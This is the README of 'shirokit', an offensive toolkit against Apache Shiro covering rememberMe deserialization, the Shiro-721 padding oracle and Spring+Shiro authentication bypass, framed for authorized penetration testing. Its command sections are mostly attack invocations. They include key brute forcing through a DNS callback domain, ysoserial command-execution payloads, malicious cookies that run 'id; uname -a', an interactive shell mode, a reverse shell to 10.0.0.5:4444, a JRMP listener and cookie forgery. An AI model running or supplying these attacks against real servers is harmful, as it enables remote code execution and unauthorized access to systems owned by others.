# shirokit

An Apache Shiro exploitation toolkit for **authorized** security assessments.

Covers Shiro-550 (`rememberMe` deserialization), Shiro-721 (CBC padding oracle)
and the Spring + Shiro authentication-bypass family: fingerprinting, key
discovery, payload generation, cookie forging, bypass scanning and an offline
self-test.

[Chinese README](README.zh-CN.md)

## Features

* **Zero third-party dependencies** - pure standard library (AES, PKCS#7,
  HTTP, DNS listener and the Java serialization writer are all implemented
  in-tree).
* **Offline detection** - built-in URLDNS payload generator; no ysoserial and
  no target-side JDK needed for key discovery.
* **Reliable verdicts** - a per-key random DNS subdomain identifies exactly
  which key decrypted; the `deleteMe` baseline is verified first, otherwise the
  scan refuses to report hits.
* **Validated key database** - 23 known-good keys, legacy dictionary audit and
  custom dictionaries.
* **Real Shiro-721** - calibrate a distinguishable oracle, recover CBC
  intermediate values, decrypt a valid cookie without the key, forge arbitrary
  cookies.
* **Bypass scanner** - 35 payloads grouped by parsing technique and compared
  against an unauthenticated baseline; login pages and login redirects are
  recognised, so a plain `200` is not treated as success.
* **ysoserial integration** - auto-discovers the jar, parses its real payload
  list and dependencies, adds the `--add-opens` / `--add-exports` flags that
  JDK 9+ requires, and turns common JVM errors into hints.
* **Self-verifying** - 26 tests, including a real JVM deserializing the
  built-in URLDNS payload and a real CB1 payload executing a command locally.

## Install

Python 3.10+ (tested on 3.13). No third-party packages are required.

```bash
# run from the repository, no install
python -m shirokit --help

# or install (adds the `shirokit` command)
pip install -e .
shirokit --help
```

Optional, for command-execution gadgets:

* a JDK (`java` / `javac`);
* `ysoserial-all.jar`, auto-discovered from any of:
  `-y/--ysoserial`, `$YSOSERIAL_JAR`, `../ysoserial/*.jar`,
  `./ysoserial/*.jar`, `./ysoserial.jar`, or the current directory.

```bash
python -m shirokit payload list       # 27 payloads and their dependencies
python -m shirokit selftest           # AES, URLDNS, key DB, listener, ysoserial
```

## Quick start

```bash
python examples/demo_local.py
```

It starts a mock Shiro target (real AES decryption, `deleteMe`, URLDNS
callback), then runs fingerprint -> key brute force -> URLDNS exploit ->
real CB1 gadget -> bypass scan. The tool output is in Chinese; the steps are:

```text
[demo] fingerprint: OK
[demo] key brute force: OK
[demo] payload generation: OK
[demo] malicious cookie: OK
[demo] CB1 gadget: OK
[demo] bypass scan: OK
```

## Commands

All examples use `python -m shirokit`; if installed, replace it with
`shirokit`.

### 1. Fingerprint

```bash
python -m shirokit fp -u http://target.com
python -m shirokit fp -u https://target.com -H 'X-Forwarded-For: 127.0.0.1' \
    --proxy http://127.0.0.1:8080
```

Checks for a `rememberMe` cookie, whether an invalid cookie triggers
`rememberMe=deleteMe`, Shiro stack traces and version hints.

### 2. Key database

```bash
python -m shirokit keys                # counts
python -m shirokit keys --audit        # every entry, including invalid ones
python -m shirokit keys --export keys.txt
```

Custom dictionary (one key per line, `#` starts a comment):

```bash
python -m shirokit brute -u http://target.com -d cb.example.com \
    --keys-file my_keys.txt
```

### 3. Key brute force

```bash
# 1) point cb.example.com (and all subdomains) at your machine
# 2) run
python -m shirokit brute -u http://target.com -d cb.example.com
```

How it decides:

1. sends a random cookie and requires `rememberMe=deleteMe`, otherwise it stops
   (no false positives);
2. for each key, generates a URLDNS payload for `s<8 hex>.cb.example.com`,
   encrypts it and sends it;
3. the built-in DNS listener reports exactly which token was resolved, i.e.
   which key decrypted successfully;
4. `--verify` retests hits with a fresh token.

```bash
python -m shirokit brute -u http://target.com -d cb.example.com \
    --dns-port 53 --workers 8 --callback-timeout 8 --verify --json report.json
```

> URLDNS only performs a DNS lookup, so the callback must be a **hostname**
> (a bare IP never triggers a DNS query). With an external dnslog you can fire
> payloads manually, but automated key-to-token matching is not possible.

### 4. Payloads and exploitation

```bash
# built-in URLDNS, no ysoserial required
python -m shirokit payload url --host abc.cb.example.com -o urldns.bin

# command execution payloads via ysoserial
python -m shirokit payload ysoserial -g CB1 -c 'id' -o cb1.bin
python -m shirokit payload list

# send a malicious cookie
python -m shirokit exploit -u http://target.com -k 'KEY' -g CB1 -c 'id'
python -m shirokit exploit -u http://target.com -k 'KEY' -p cb1.bin --check
python -m shirokit exploit -u http://target.com -k 'KEY' -g CC6 \
    -c 'id; uname -a' --shell

# reverse shell template (Linux targets; pass your own command for Windows)
python -m shirokit exploit -u http://target.com -k 'KEY' -g CB1 \
    --reverse 10.0.0.5 4444
```

The result distinguishes three cases: `deleteMe` returned (wrong key, gadget
blocked, or cookie truncated), no `deleteMe` (decryption and deserialization
likely succeeded), or an unexpected response (manual check).

### 5. Spring + Shiro auth bypass

```bash
python -m shirokit bypass -u http://target.com -p /admin/
python -m shirokit bypass -u http://target.com -p /admin/ --technique semicolon
python -m shirokit bypass -p /admin/ --list          # payloads and techniques
```

Verdicts are based on an unauthenticated baseline:

* `BYPASS` - 200, not a login page, and different from the baseline;
* `MAYBE` - redirect to a non-login location;
* `AUTH` - 401/403;
* `FAILED` - login redirect, 404, or identical to the baseline.

Payloads are labelled by **technique** (`semicolon`, `encoded-dot`,
`double-slash`, `whitespace`, `trailing-slash`, ...) rather than by CVE number.
Apache advisories describe the behaviour ("a crafted request may cause an
authentication bypass") but do not define a payload-to-CVE mapping; the same
path can correspond to different CVEs depending on Shiro/Spring/container
versions, and one CVE covers many variants. shirokit therefore avoids making a
claim it cannot substantiate.

### 6. Shiro-721 (padding oracle)

```bash
# calibrate: does the target distinguish valid from invalid padding?
python -m shirokit padding -u http://target.com --self-test

# or state the oracle explicitly
python -m shirokit padding -u http://target.com --oracle status=200 --self-test

# decrypt a valid cookie without knowing the key
python -m shirokit padding -u http://target.com --oracle status=200 \
    --recover '<cookie>'

# forge a valid cookie for any payload
python -m shirokit padding -u http://target.com --oracle status=200 \
    --forge cb1.bin
```

Caveats:

* stock Shiro returns `deleteMe` for both decryption failures and
  deserialization failures, so there is no built-in oracle; a target is only
  exploitable when its exception handling or a proxy leaks a difference
  (status code, error page, timing);
* `calibrate()` probes for such a difference and exits if there is none;
* recovering one 16-byte block costs up to 16 x 256 requests, so start with
  `--recover` and short payloads.

### 7. Out-of-band: JRMP

```bash
# terminal 1: listener (uses ysoserial's exploit class)
python -m shirokit jrmp --lhost 10.0.0.5 --lport 1099 -g CB1 -c 'id'

# terminal 2: JRMPClient payload
python -m shirokit payload ysoserial -g JRMPClient -c '10.0.0.5:1099' \
    -o jrmp.bin

# terminal 3: send it
python -m shirokit exploit -u http://target.com -k 'KEY' -p jrmp.bin
```

### 8. Other

```bash
python -m shirokit serve --dns-port 53 --http-port 8000
python -m shirokit selftest
python -m shirokit fullscan -u http://target.com -d cb.example.com -c 'id'
```

## Project layout

```text
shiro-tools/
|-- shirokit/
|   |-- __main__.py
|   |-- cli.py           # subcommands
|   |-- aes.py           # pure-Python AES/CBC/PKCS7 + Shiro cookie format
|   |-- jserial.py       # Java serialization stream writer
|   |-- gadgets.py       # built-in URLDNS + ysoserial bridge
|   |-- keys.py          # validated key database + legacy dictionary audit
|   |-- httpc.py         # dependency-free HTTP client
|   |-- detect.py        # Shiro fingerprinting
|   |-- rememberme.py    # cookie build/parse/verdict
|   |-- brute.py         # key brute force
|   |-- bypass.py        # auth-bypass payloads and scanner
|   |-- padding.py       # Shiro-721 padding oracle
|   `-- callback.py      # DNS/HTTP callback listeners
|-- examples/demo_local.py
|-- tests/               # mock Shiro/Spring targets + 26 tests
|-- pyproject.toml
|-- run_tests.py
|-- README.md
`-- README.zh-CN.md
```

## Tests

```bash
python run_tests.py -v
```

`Ran 26 tests ... OK`. Coverage:

1. AES FIPS-197 vectors, `IV || CT` cookie format, random-IV round trip;
2. key database audit (invalid legacy keys must be detected);
3. a real JVM deserializes the built-in URLDNS payload and an
   `InetAddressResolverProvider` proves that DNS resolution actually happens;
4. ysoserial integration: payload table parsing, CB1/CC6/URLDNS generation,
   **local CB1 command execution**, a real CB1 cookie accepted by the mock
   target, and the correct `-cp ... JRMPListener` launch command;
5. mock Shiro: fingerprint, brute force (only the correct key hits), wrong-key
   `deleteMe`, cookie delivery;
6. mock Spring: bypasses are found and false positives are avoided, and the
   output contains no CVE labels;
7. padding oracle: recovery, cookie decryption, forgery, and calibration on
   both distinguishable and indistinguishable targets.

JVM-dependent tests are skipped automatically without a JDK; ysoserial tests
are skipped when no jar is found.

## Author

M3ngde

## Legal

For **authorized** penetration tests, red-team engagements and your own assets
only. Unauthorized use is illegal; the authors accept no liability. Make sure
the target is in scope before running anything.
